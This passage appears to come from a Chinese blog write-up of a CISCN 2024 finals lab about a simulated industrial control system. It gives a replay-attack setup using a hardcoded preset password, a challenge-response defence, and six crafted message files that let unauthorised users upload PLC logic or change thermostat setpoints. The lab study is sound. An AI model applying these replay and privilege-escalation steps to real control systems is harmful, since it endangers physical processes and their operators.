punctuation">,</span><span class="token property">"action"</span><span class="token operator">:</span><span class="token string">"ADJUST"</span><span class="token punctuation">,</span><span class="token property">"action_desc"</span><span class="token operator">:</span><span class="token string">"set_T"</span><span class="token punctuation">,</span><span class="token property">"value"</span><span class="token operator">:</span><span class="token number">3900</span><span class="token punctuation">,</span><span class="token property">"plc_operator"</span><span class="token operator">:</span><span class="token string">"qian"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240712204232928.png" alt="image-20240712204232928"></p><hr><h3 id="身份认证安全测试"><a href="#身份认证安全测试" class="headerlink" title="身份认证安全测试"></a>身份认证安全测试</h3><h4 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a>中间人攻击</h4><blockquote><p>系统在工程师站engineer_station和管理中心center之间插入了一个<code>login_hacker</code><strong>实例</strong>，用该实例来模拟攻击行为。当前实例中使用了一个<code>echo_plugin</code><strong>模块</strong>，该模块只是简单地转发收到的消息，不会产生攻击行为。</p></blockquote><blockquote><p>某攻击者开发了一个<strong>重放攻击模块</strong><code>login_hacker</code>,该模块可以<strong>记录登录用户的名称与所使用的认证口令</strong>，如果攻击者使用登录过的用户名进行登录，并且在口令处使用攻击者预设的口令，则模块将自动使用以前记录的口令进行登录。</p></blockquote><blockquote><p>请用login_hacker模块替换echo_plugin模块，并且正确填写工程师用户目录下的engineer_login_nopass.msg，使攻击者可以在没有工程师用户口令的情况下在工程师站仿冒工程师进行登录。</p></blockquote><p>cube架构的实例将准备使用的模块列在plugin_config.cfg文件中，每个选用的模块都有两个名字：</p><ul><li><p>name表示实例中该模块的名称，在定义路由时使用这个名字，这个名字一般与模块在实例中的使用方式相关。</p></li><li><p>libname则是该模块开发时使用的名字，这个名字一般表现了开发者对其的定位。这里<code>echo_plugin</code>和<code>login_hacker</code>都是libname</p></li></ul><p>因为<code>task_1_2.sh</code>中的运行命令为：<code>yes | cp -a instance/login_hacker/plugin_config.cfg.task_1_2 instance/login_hacker/plugin_config.cfg </code>，所以我们只需要修改 plugin_config.cfg.task_1_2 的 libname 即可</p><p>修改后的plugin_config.cfg.task_1_2：</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>        <span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"login_hacker"</span><span class="token punctuation">,</span>        <span class="token property">"libname"</span><span class="token operator">:</span><span class="token string">"login_hacker"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><br><blockquote><p>login_hacker模块的源码在 2024buildup&#x2F;src&#x2F;security 下面的某个同名目录中，以c语言编写，阅读其源码，可以找到所用的预设口令</p></blockquote><p>src&#x2F;security&#x2F;login_hacker&#x2F;login_hacker.c</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240712164109641.png" alt="image-20240712164109641"></p><p>可知口令在这里是<code>static char security_pass[32] = &quot;Tclab2024&quot;;</code>，即<code>Tclab2024</code></p><p>拿到口令之后，修改 instance&#x2F;engineer&#x2F;user&#x2F;engineer_login_nopass.msg，在口令处使用攻击者预设的口令</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"GENERAL_RETURN"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"STRING"</span><span class="token punctuation">,</span><span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"login"</span><span class="token punctuation">,</span><span class="token property">"return_value"</span><span class="token operator">:</span><span class="token string">"zhao:Tclab2024"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>验证：</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240712170232030.png" alt="image-20240712170232030"></p><p>可以看到第二次的时候成功登录</p><br><p>此外，也可以顺便了解下cube架构中模块的逻辑。cube架构的模块其结构比较清晰：</p><ul><li><p>一般用<code>一个模块名+init的函数（称为模块的init函数）</code>进行模块载入时的<strong>初始化操作</strong></p></li><li><p>用<code>一个模块名+start的函数（称为模块的start函数）</code>作为模块的<strong>主体</strong>，持续进行循环，每次循环检查模块接收到的消息并进行处理。</p><p>start函数根据消息的格式分流消息，让每种消息调用自己的专用操作函数。如果模块的几个处理流程共用同一种消息格式，则一般在消息处理函数中获取消息后，再根据消息内容进行第二次分流，一般而言，每个流程都有自己专门的处理函数</p></li></ul><hr><h4 id="挑战-应答机制"><a href="#挑战-应答机制" class="headerlink" title="挑战-应答机制"></a>挑战-应答机制</h4><blockquote><p>为了防范中间人攻击，我们准备用挑战-应答机制来替换掉当前使用的口令字符串哈希的认证机制。当前使用的用户端登录处理模块<code>login_user</code>和服务端登录处理模块<code>login_server</code>本身就具备了支持挑战-应答机制的能力。请正确配置参数和路由，实现挑战-应答机制，以防范重放攻击行为</p></blockquote><p>在 plugin_config.cfg 中定义模块时，可以使用<code>init_para</code>参数来为模块提供一些配置信息</p><p>配置信息的定义一般在模块的定义文件cfg中。如 login_user.cfg 中给出了<code>init_para_desc</code>的定义，定义中用mode值来表示模块采用哪一种登录机制。</p><p>plugin&#x2F;login_user.cfg</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"libname"</span><span class="token operator">:</span><span class="token string">"login_user"</span><span class="token punctuation">,</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"MONITOR"</span><span class="token punctuation">,</span><span class="token property">"dynamic_lib"</span><span class="token operator">:</span><span class="token string">"liblogin_user.so"</span><span class="token punctuation">,</span><span class="token property">"init"</span><span class="token operator">:</span><span class="token string">"login_user_init"</span><span class="token punctuation">,</span><span class="token property">"start"</span><span class="token operator">:</span><span class="token string">"login_user_start"</span><span class="token punctuation">,</span><span class="token property">"init_para_desc"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"elem_no"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"elem_desc"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"mode"</span><span class="token punctuation">,</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"INT"</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>plugin模块定义时，可以用<code>&quot;init_para&quot;:&#123;&quot;mode&quot;:1&#125;</code>来表示模块选择了模式1</p><blockquote><p>请通过阅读源码确定哪种模式是挑战应答模式，并在plugin_config.cfg中正确配置</p></blockquote><p>直接全局搜索找到相关的代码</p><p>src&#x2F;system&#x2F;login_user&#x2F;login_user.c</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240712174924813.png" alt="image-20240712174924813"></p><p>可知是模式2，那么plugin_config.cfg.task_1_3：</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>        <span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"msg_send"</span><span class="token punctuation">,</span>        <span class="token property">"libname"</span><span class="token operator">:</span><span class="token string">"msgfile_send"</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span>        <span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"msg_print"</span><span class="token punctuation">,</span>        <span class="token property">"libname"</span><span class="token operator">:</span><span class="token string">"msgrecord_print"</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span>        <span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"file_dealer"</span><span class="token punctuation">,</span>        <span class="token property">"libname"</span><span class="token operator">:</span><span class="token string">"file_dealer"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span>        <span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"login_user"</span><span class="token punctuation">,</span>        <span class="token property">"libname"</span><span class="token operator">:</span><span class="token string">"login_user"</span><span class="token punctuation">,</span>        <span class="token property">"init_para"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>                <span class="token property">"mode"</span><span class="token operator">:</span><span class="token number">2</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span>        <span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"logic_upload"</span><span class="token punctuation">,</span>        <span class="token property">"libname"</span><span class="token operator">:</span><span class="token string">"logic_upload"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><blockquote><p>挑战-应答机制中，用户和服务器之间会进行<strong>两次交互</strong>，而旧的消息路由只提供了一次交互流程，需要重新配置认证流程</p></blockquote><p>旧的身份认证流程是用login路由来认证的，它由engineer&#x2F;user，engineer&#x2F;station和monitor_center中定义的login路由相互连接而形成，类型为QUERY，表示该路由为登录后返回的过程。</p><p>而在支持挑战-应答机制时，<strong>login_user在收到返回消息后，会生成状态为CHALLENGE格式的登录消息，这个消息将再次发送到server端并完成登录行为</strong>。</p><p>我们把工程师站login_user收到用户登录消息后，发送消息给管理中心login_server，并获得挑战信息的过程看做是插入到原有登录过程中的新过程，就可以使用cube架构中的<strong>切面路由机制</strong>。</p><p>这个机制定义的路由一般放在aspect_policy.cfg中，选项可定为ASPECT，是指在原路由中插入了一段处理过程，处理过程完成后回到原本路由。 用路由图来描述则如下所示：</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/%E5%9B%BE%E7%89%871.png" alt="图片1"></p><p>切面路由将有自己的新名称，这里我们将新的切面路由命名为 challenge_login，在管理中心的路由配置文件中定义，可以把它当作是由切入点开始的QUERY格式路由（询问模式，发出消息抵达目标后原路返回)，最终回到切入点，再重新执行原流程。</p><p>instance&#x2F;engineer&#x2F;station&#x2F;aspect_policy.cfg</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"policy_head"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"login"</span><span class="token punctuation">,</span>       <span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"ASPECT"</span><span class="token punctuation">,</span>        <span class="token property">"sender"</span><span class="token operator">:</span><span class="token string">"login_user"</span><span class="token punctuation">,</span><span class="token property">"ljump"</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token property">"rjump"</span><span class="token operator">:</span><span class="token number">-2</span><span class="token punctuation">,</span><span class="token property">"newname"</span><span class="token operator">:</span><span class="token string">"challenge_login"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token property">"MATCH_RULES"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token property">"op"</span><span class="token operator">:</span><span class="token string">"AND"</span><span class="token punctuation">,</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"USER_DEFINE"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"LOGIN"</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token property">"ROUTE_RULES"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"main_policy"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token property">"target_type"</span><span class="token operator">:</span><span class="token string">"CONN"</span><span class="token punctuation">,</span><span class="token property">"target_name"</span><span class="token operator">:</span><span class="token string">"center_client"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">]</span>        <span class="token property">"response_policy"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token property">"target_type"</span><span class="token operator">:</span><span class="token string">"LOCAL"</span><span class="token punctuation">,</span><span class="token property">"target_name"</span><span class="token operator">:</span><span class="token string">"login_user"</span><span class="token punctuation">&#125;</span>        <span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p><code>policy_head</code>：拦截位置</p></li><li><p><code>name</code>：被拦截路由</p></li><li><p><code>type</code>有两种取值：</p><p>复制（<code>DUP</code>）表示从原路由复制信息，不改变原路由传输方式</p><p>拦截（<code>ASPECT</code>）则是让原路由转去新路由进行处理，完成处理后无异常情况则返回原路由途径</p></li><li><p><code>ljump</code>表示是在本地路由的第几跳（生成&#x2F;收到消息为第1跳，经过一个模块增加1跳，<code>sender</code>表示路由的发送者，这两个共同定义了路由的起始位置。<code>rjump</code>是一个准备被废弃或替代的参数，在这里的唯一作用是用负值表示拦截的是返回信息。</p></li><li><p><code>newname</code>则表示复制或拦截路由所在的新路由名称，这里复制路由上的消息将沿着新路由传播，而拦截路由上的消息则在完成新路由并返回后，重新进入原路由，沿着拦截点继续传播。</p></li><li><p><code>MATCH_RULES</code>中的内容表示切面触发时消息要满足的条件，<code>ROUTE_RULES</code>则指消息在新路由中传播的路径。这里的路由可以指向其它实例，在其它实例中与其对接的路由应当是与新路由名称一致的DELIVER格式路由（与DUP格式切面路由对接）或QUERY格式路由（与ASPECT格式路由对接）。</p></li></ul><p>aspect_policy.cfg.task_1_3：直接复制<code>./instance/engineer/station/plugin_config.cfg</code>文件的内容就行，拦截-转发逻辑是预先写好的</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240712191107681.png" alt="image-20240712191107681"></p><hr><h2 id="攻击模拟任务"><a href="#攻击模拟任务" class="headerlink" title="攻击模拟任务"></a>攻击模拟任务</h2><h3 id="越权访问"><a href="#越权访问" class="headerlink" title="越权访问"></a>越权访问</h3><p>本过程由用户测试系统中可以进行越权访问的位置</p><p>本系统中，工程师、操作员和系统监视员除可执行规定允许的操作外，还有如下限制：</p><ol><li>工程师可以登录操作员站和管理终端，但只能观察数据，不能执行调节温度等控制行为。</li><li>操作员可以登录管理终端，但只能观察数据，不能在监视终端执行调节温度等控制行为。</li><li>监视员可以登录操作员站，但只能观察数据，不能在监视终端执行调节温度等控制行为。</li><li>操作员和监视员均可登录工程师站，但不能执行代码上传和逻辑上传命令。</li></ol><blockquote><p>请在工程师站、操作员站和监视终端进行测试，找到可以违规操作的点</p></blockquote><p>控制行为用调节温度到39度代表，参考操作员用户目录下的plc_set_t.msg</p><p>上传命令则用代码上传代表，参考工程师用户目录下的code_upload.msg</p><p>在工程师站、操作员站和管理终端各找到两个可违规操作点，按照下表创建违规登录与操作的组合消息：</p><table><thead><tr><th>位置</th><th>编号</th><th>登录（使用非合规用户）</th><th>操作（非合规用户执行违规操作）</th><th>备注</th></tr></thead><tbody><tr><td>工程师用户</td><td>违规点1</td><td>attack_login1.msg</td><td>attack_cmd1.msg</td><td></td></tr><tr><td></td><td>违规点2</td><td>attack_login2.msg</td><td>attack_cmd2.msg</td><td></td></tr><tr><td>操作员用户</td><td>违规点3</td><td>attack_login3.msg</td><td>attack_cmd3.msg</td><td></td></tr><tr><td></td><td>违规点4</td><td>attack_login4.msg</td><td>attack_cmd4.msg</td><td></td></tr><tr><td>监视员用户</td><td>违规点5</td><td>attack_login5.msg</td><td>attack_cmd5.msg</td><td></td></tr><tr><td></td><td>违规点6</td><td>attack_login6.msg</td><td>attack_cmd6.msg</td><td></td></tr></tbody></table><p>对上面的描述进行阅读理解，形成一个表格（byd这几句话真给我cpu干烧了）</p><table><thead><tr><th></th><th>登录操作员站</th><th>登录监视终端</th><th>登录工程师站</th><th>操作员站调节温度</th><th>监视终端调节温度</th><th>代码上传和逻辑上传</th></tr></thead><tbody><tr><td>工程师</td><td>√</td><td>√</td><td>√</td><td></td><td></td><td>√</td></tr><tr><td>操作员</td><td>√</td><td>√</td><td>√</td><td>√</td><td></td><td></td></tr><tr><td>监视员</td><td>√</td><td>√</td><td>√</td><td></td><td>√</td><td></td></tr></tbody></table><p>那么，违规的情况就是：</p><p>工程师站：</p><ul><li>操作员执行文件上传</li><li>监视员执行文件上传</li></ul><p>操作员站：</p><ul><li>工程师执行调节温度</li><li>监视员执行调节温度</li></ul><p>监视终端：</p><ul><li>操作员执行调节温度</li><li>工程师执行调节温度</li></ul><p>于是就能开始改文件了，用户名见<a href="#user.list">user.list</a></p><p>attack_login1.msg</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"GENERAL_RETURN"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"STRING"</span><span class="token punctuation">,</span><span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"login"</span><span class="token punctuation">,</span><span class="token property">"return_value"</span><span class="token operator">:</span><span class="token string">"qian:456"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>attack_cmd1.msg</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"PLC_ENGINEER"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"LOGIC_UPLOAD"</span><span class="token punctuation">,</span><span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"plc_devname"</span><span class="token operator">:</span><span class="token string">"thermostat"</span><span class="token punctuation">,</span><span class="token property">"logic_filename"</span><span class="token operator">:</span><span class="token string">"thermostat_logic.c"</span><span class="token punctuation">,</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"FILE_CODE"</span><span class="token punctuation">,</span><span class="token property">"author"</span><span class="token operator">:</span><span class="token string">"qian"</span><span class="token punctuation">,</span><span class="token property">"uploader"</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>attack_login2.msg</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"GENERAL_RETURN"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"STRING"</span><span class="token punctuation">,</span><span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"login"</span><span class="token punctuation">,</span><span class="token property">"return_value"</span><span class="token operator">:</span><span class="token string">"sun:123"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>attack_cmd2.msg</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"PLC_ENGINEER"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"LOGIC_UPLOAD"</span><span class="token punctuation">,</span><span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"plc_devname"</span><span class="token operator">:</span><span class="token string">"thermostat"</span><span class="token punctuation">,</span><span class="token property">"logic_filename"</span><span class="token operator">:</span><span class="token string">"thermostat_logic.c"</span><span class="token punctuation">,</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"FILE_CODE"</span><span class="token punctuation">,</span><span class="token property">"author"</span><span class="token operator">:</span><span class="token string">"sun"</span><span class="token punctuation">,</span><span class="token property">"uploader"</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240713112158556.png" alt="image-20240713112158556"></p><p>attack_login3.msg</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"GENERAL_RETURN"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"STRING"</span><span class="token punctuation">,</span><span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"login"</span><span class="token punctuation">,</span><span class="token property">"return_value"</span><span class="token operator">:</span><span class="token string">"sun:123"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>attack_cmd3.msg</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"PLC_OPERATOR"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"PLC_CMD"</span><span class="token punctuation">,</span><span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"plc_devname"</span><span class="token operator">:</span><span class="token string">"thermostat"</span><span class="token punctuation">,</span><span class="token property">"action"</span><span class="token operator">:</span><span class="token string">"ADJUST"</span><span class="token punctuation">,</span><span class="token property">"action_desc"</span><span class="token operator">:</span><span class="token string">"set_T"</span><span class="token punctuation">,</span><span class="token property">"value"</span><span class="token operator">:</span><span class="token number">3900</span><span class="token punctuation">,</span><span class="token property">"plc_operator"</span><span class="token operator">:</span><span class="token string">"sun"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>attack_login4.msg</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"GENERAL_RETURN"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"STRING"</span><span class="token punctuation">,</span><span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"login"</span><span class="token punctuation">,</span><span class="token property">"return_value"</span><span class="token operator">:</span><span class="token string">"zhao:123"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>attack_cmd4.msg</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"PLC_OPERATOR"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"PLC_CMD"</span><span class="token punctuation">,</span><span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"plc_devname"</span><span class="token operator">:</span><span class="token string">"thermostat"</span><span class="token punctuation">,</span><span class="token property">"action"</span><span class="token operator">:</span><span class="token string">"ADJUST"</span><span class="token punctuation">,</span><span class="token property">"action_desc"</span><span class="token operator">:</span><span class="token string">"set_T"</span><span class="token punctuation">,</span><span class="token property">"value"</span><span class="token operator">:</span><span class="token number">3900</span><span class="token punctuation">,</span><span class="token property">"plc_operator"</span><span class="token operator">:</span><span class="token string">"zhao"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240713112608105.png" alt="image-20240713112608105"></p><p>attack_login5.msg</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"GENERAL_RETURN"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"STRING"</span><span class="token punctuation">,</span><span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"login"</span><span class="token punctuation">,</span><span class="token property">"return_value"</span><span class="token operator">:</span><span class="token string">"zhao:123"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>attack_cmd5.msg</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"PLC_OPERATOR"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"PLC_CMD"</span><span class="token punctuation">,</span><span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"plc_devname"</span><span class="token operator">:</span><span class="token string">"thermostat"</span><span class="token punctuation">,</span><span class="token property">"action"</span><span class="token operator">:</span><span class="token string">"ADJUST"</span><span class="token punctuation">,</span><span class="token property">"action_desc"</span><span class="token operator">:</span><span class="token string">"set_T"</span><span class="token punctuation">,</span><span class="token property">"value"</span><span class="token operator">:</span><span class="token number">3900</span><span class="token punctuation">,</span><span class="token property">"plc_operator"</span><span class="token operator">:</span><span class="token string">"zhao"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>attack_login6.msg</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"GENERAL_RETURN"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"STRING"</span><span class="token punctuation">,</span><span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"login"</span><span class="token punctuation">,</span><span class="token property">"return_value"</span><span class="token operator">:</span><span class="token string">"qian:456"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>attack_cmd6.msg</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"PLC_OPERATOR"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"PLC_CMD"</span><span class="token punctuation">,</span><span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"plc_devname"</span><span class="token operator">:</span><span class="token string">"thermostat"</span><span class="token punctuation">,</span><span class="token property">"action"</span><span class="token operator">:</span><span class="token string">"ADJUST"</span><span class="token punctuation">,</span><span class="token property">"action_desc"</span><span class="token operator">:</span><span class="token string">"set_T"</span><span class="token punctuation">,</span><span class="token property">"value"</span><span class="token operator">:</span><span class="token number">3900</span><span class="token punctuation">,</span><span class="token property">"plc_operator"</span><span class="token operator">:</span><span class="token string">"qian"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240713112954670.png" alt="image-20240713112954670"></p><hr><h3 id="恶意逻辑"><a href="#恶意逻辑" class="headerlink" 